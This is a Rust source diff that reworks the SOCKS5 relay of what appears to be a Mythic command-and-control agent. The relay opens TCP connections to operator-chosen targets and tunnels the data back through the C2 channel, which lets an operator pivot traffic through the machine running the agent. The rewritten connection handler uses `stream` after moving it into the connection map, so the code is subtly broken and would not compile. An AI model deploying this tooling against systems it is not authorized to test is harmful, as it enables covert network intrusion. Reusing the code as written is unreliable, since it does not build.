@@ -5,10 +5,10 @@ use base64::{decode, encode};
 use serde::{Deserialize, Serialize};
 use std::collections::HashMap;
 use std::error::Error;
-use std::net::{Ipv4Addr, SocketAddr, ToSocketAddrs};
+use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr, TcpStream};
 use std::sync::{mpsc, Arc, Mutex};
-use tokio::io::{AsyncReadExt, AsyncWriteExt};
-use tokio::net::TcpStream;
+use std::io::{Read, Write};
+use std::time::Duration;
 
 #[derive(Deserialize, Serialize, Debug, Clone)]
 pub struct SocksMsg {
@@ -19,15 +19,13 @@ pub struct SocksMsg {
 
 #[derive(Debug)]
 pub struct SocksState {
-    pub connections: Arc<Mutex<HashMap<u32, std::net::SocketAddr>>>,
-    pub outbound: Arc<Mutex<Vec<SocksMsg>>>,
+    pub connections: Arc<Mutex<HashMap<u32, TcpStream>>>,
 }
 
 impl SocksState {
     pub fn new() -> Self {
         Self {
             connections: Arc::new(Mutex::new(HashMap::new())),
-            outbound: Arc::new(Mutex::new(Vec::new())),
         }
     }
 }
@@ -37,123 +35,217 @@ pub fn start_socks(tx: &mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serd
     tx.send(mythic_continued!(task.id, "success", "SOCKS relay started"))?;
     
     let state = Arc::new(SocksState::new());
-    let rt = tokio::runtime::Runtime::new()?;
-    rt.block_on(relay_loop(tx.clone(), rx, state));
-    Ok(())
-}
-
-async fn relay_loop(tx: mpsc::Sender<serde_json::Value>, rx: mpsc::Receiver<serde_json::Value>, state: Arc<SocksState>) {
+    
+    // Process SOCKS messages in a loop
     while let Ok(msg) = rx.recv() {
         if let Ok(task) = serde_json::from_value::<AgentTask>(msg) {
             if task.command == "socks_data" {
                 if let Ok(msgs) = serde_json::from_str::<Vec<SocksMsg>>(&task.parameters) {
-                    process_messages(&tx, msgs, &state).await;
+                    if let Err(e) = process_socks_messages(&tx, msgs, &state) {
+                        eprintln!("SOCKS processing error: {}", e);
+                    }
                 }
             }
         }
     }
+    Ok(())
 }
 
-async fn process_messages(tx: &mpsc::Sender<serde_json::Value>, msgs: Vec<SocksMsg>, state: &Arc<SocksState>) {
+fn process_socks_messages(
+    tx: &mpsc::Sender<serde_json::Value>,
+    msgs: Vec<SocksMsg>,
+    state: &Arc<SocksState>,
+) -> Result<(), Box<dyn Error>> {
     let mut conns = state.connections.lock().unwrap();
-    let mut outbound = state.outbound.lock().unwrap();
+    let mut responses = Vec::new();
 
     for msg in msgs {
         if msg.exit {
-            conns.remove(&msg.server_id);
+            // Close connection
+            if let Some(mut stream) = conns.remove(&msg.server_id) {
+                let _ = stream.shutdown(std::net::Shutdown::Both);
+            }
             continue;
         }
 
         let data = decode(&msg.data).unwrap_or_default();
-
-        if conns.contains_key(&msg.server_id) {
+        
+        if data.is_empty() {
             continue;
-        } else {
-            let addr = parse_socks_address(&data);
-            if let Some(addr) = addr {
-                if let Ok(stream) = TcpStream::connect(addr).await {
-                    conns.insert(msg.server_id, addr);
-                    
-                    let tx_clone = tx.clone();
-                    let state_clone = state.clone();
-                    let server_id = msg.server_id;
-                    let initial_data = data.clone();
-                    
-                    tokio::spawn(async move {
-                        handle_socks_connection(server_id, stream, initial_data, tx_clone, state_clone).await;
-                    });
+        }
+
+        if let Some(stream) = conns.get_mut(&msg.server_id) {
+            // Existing connection - write data
+            if let Err(_) = stream.write_all(&data) {
+                // Write failed, close connection
+                responses.push(SocksMsg {
+                    exit: true,
+                    server_id: msg.server_id,
+                    data: String::new(),
+                });
+                conns.remove(&msg.server_id);
+            } else {
+                // Try to read response
+                let mut buf = [0u8; 4096];
+                stream.set_read_timeout(Some(Duration::from_millis(100)))?;
+                match stream.read(&mut buf) {
+                    Ok(0) => {
+                        // Connection closed
+                        responses.push(SocksMsg {
+                            exit: true,
+                            server_id: msg.server_id,
+                            data: String::new(),
+                        });
+                        conns.remove(&msg.server_id);
+                    }
+                    Ok(n) => {
+                        // Send data back to Mythic
+                        responses.push(SocksMsg {
+                            exit: false,
+                            server_id: msg.server_id,
+                            data: encode(&buf[..n]),
+                        });
+                    }
+                    Err(_) => {
+                        // No data available or error, continue
+                    }
                 }
             }
-        }
-    }
-
-    if !outbound.is_empty() {
-        let json = serde_json::to_string(&*outbound).unwrap();
-        let _ = tx.send(serde_json::json!({
-            "command": "socks_data",
-            "parameters": json,
-            "id": "socks_outbound"
-        }));
-        outbound.clear();
-    }
-}
-
-async fn handle_socks_connection(
-    server_id: u32,
-    mut stream: TcpStream,
-    initial_data: Vec<u8>,
-    // CORRECCIÓN: Prefija con _ para indicar que está intencionalmente sin usar
-    _tx: mpsc::Sender<serde_json::Value>,
-    state: Arc<SocksState>,
-) {
-    let _ = stream.write_all(&initial_data).await;
-    
-    let mut buf = [0u8; 4096];
-    
-    loop {
-        match stream.read(&mut buf).await {
-            Ok(0) => break,
-            Ok(n) => {
-                let data = encode(&buf[..n]);
-                let msg = SocksMsg { exit: false, server_id, data };
-                state.outbound.lock().unwrap().push(msg);
+        } else {
+            // New connection - parse SOCKS5 request and connect
+            if let Some((target_addr, response_data)) = handle_socks_connect(&data) {
+                match TcpStream::connect(&target_addr) {
+                    Ok(mut stream) => {
+                        // Send SOCKS5 success response
+                        responses.push(SocksMsg {
+                            exit: false,
+                            server_id: msg.server_id,
+                            data: encode(&response_data),
+                        });
+                        
+                        // Store the connection
+                        conns.insert(msg.server_id, stream);
+                        
+                        // Try to read initial data from target
+                        let mut buf = [0u8; 4096];
+                        stream.set_read_timeout(Some(Duration::from_millis(100)))?;
+                        if let Ok(n) = stream.read(&mut buf) {
+                            if n > 0 {
+                                responses.push(SocksMsg {
+                                    exit: false,
+                                    server_id: msg.server_id,
+                                    data: encode(&buf[..n]),
+                                });
+                            }
+                        }
+                    }
+                    Err(_) => {
+                        // Connection failed - send SOCKS5 error
+                        let error_response = build_socks5_error(0x05); // Connection refused
+                        responses.push(SocksMsg {
+                            exit: false,
+                            server_id: msg.server_id,
+                            data: encode(&error_response),
+                        });
+                    }
+                }
+            } else {
+                // Invalid SOCKS5 request - send error
+                let error_response = build_socks5_error(0x07); // Command not supported
+                responses.push(SocksMsg {
+                    exit: false,
+                    server_id: msg.server_id,
+                    data: encode(&error_response),
+                });
             }
-            Err(_) => break,
         }
     }
-    
-    state.outbound.lock().unwrap().push(SocksMsg { 
-        exit: true, 
-        server_id, 
-        data: String::new() 
-    });
-    
-    state.connections.lock().unwrap().remove(&server_id);
+
+    // Send responses back to Mythic
+    if !responses.is_empty() {
+        let json = serde_json::to_string(&responses)?;
+        let _ = tx.send(serde_json::json!({
+            "user_output": "SOCKS data processed",
+            "socks": json,
+            "task_id": "socks_processing"
+        }));
+    }
+
+    Ok(())
 }
 
-fn parse_socks_address(data: &[u8]) -> Option<SocketAddr> {
-    if data.len() < 6 || data[0] != 5 || data[1] != 1 {
+fn handle_socks_connect(data: &[u8]) -> Option<(SocketAddr, Vec<u8>)> {
+    if data.len() < 10 {
         return None;
     }
-    let atyp = data[3];
-    let mut idx = 4;
-    match atyp {
-        1 => {
-            if data.len() < idx + 6 { return None; }
-            let ip = Ipv4Addr::new(data[idx], data[idx+1], data[idx+2], data[idx+3]);
-            idx += 4;
-            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
-            Some(SocketAddr::from((ip, port)))
-        }
-        3 => {
-            let len = data[idx] as usize;
-            idx += 1;
-            if data.len() < idx + len + 2 { return None; }
-            let domain = String::from_utf8_lossy(&data[idx..idx+len]).to_string();
-            idx += len;
-            let port = u16::from_be_bytes([data[idx], data[idx+1]]);
-            (domain.as_str(), port).to_socket_addrs().ok()?.next()
-        }
-        _ => None,
+
+    // Parse SOCKS5 CONNECT request
+    if data[0] != 0x05 || data[1] != 0x01 || data[2] != 0x00 {
+        return None;
     }
+
+    let atyp = data[3];
+    let (addr, addr_len) = match atyp {
+        0x01 => { // IPv4
+            if data.len() < 10 { return None; }
+            let ip = Ipv4Addr::new(data[4], data[5], data[6], data[7]);
+            let port = u16::from_be_bytes([data[8], data[9]]);
+            (SocketAddr::from((ip, port)), 10)
+        }
+        0x03 => { // Domain name
+            let domain_len = data[4] as usize;
+            if data.len() < 5 + domain_len + 2 { return None; }
+            let domain = String::from_utf8_lossy(&data[5..5 + domain_len]);
+            let port = u16::from_be_bytes([data[5 + domain_len], data[5 + domain_len + 1]]);
+            
+            // Resolve domain (simplified - in production you'd want proper async resolution)
+            if let Ok(sockaddrs) = (domain.as_ref(), port).to_socket_addrs() {
+                if let Some(addr) = sockaddrs.into_iter().next() {
+                    (addr, 5 + domain_len + 2)
+                } else {
+                    return None;
+                }
+            } else {
+                return None;
+            }
+        }
+        0x04 => { // IPv6
+            if data.len() < 22 { return None; }
+            let mut octets = [0u8; 16];
+            octets.copy_from_slice(&data[4..20]);
+            let ip = Ipv6Addr::from(octets);
+            let port = u16::from_be_bytes([data[20], data[21]]);
+            (SocketAddr::from((ip, port)), 22)
+        }
+        _ => return None,
+    };
+
+    // Build SOCKS5 success response
+    let response = build_socks5_success(addr);
+
+    Some((addr, response))
+}
+
+fn build_socks5_success(addr: SocketAddr) -> Vec<u8> {
+    let mut response = vec![0x05, 0x00, 0x00];
+    
+    match addr {
+        SocketAddr::V4(v4) => {
+            response.push(0x01); // IPv4
+            response.extend_from_slice(&v4.ip().octets());
+            response.extend_from_slice(&v4.port().to_be_bytes());
+        }
+        SocketAddr::V6(v6) => {
+            response.push(0x04); // IPv6
+            response.extend_from_slice(&v6.ip().octets());
+            response.extend_from_slice(&v6.port().to_be_bytes());
+        }
+    }
+    
+    response
+}
+
+fn build_socks5_error(error_code: u8) -> Vec<u8> {
+    // Generic error response - IPv4 with all zeros
+    vec![0x05, error_code, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]
 }
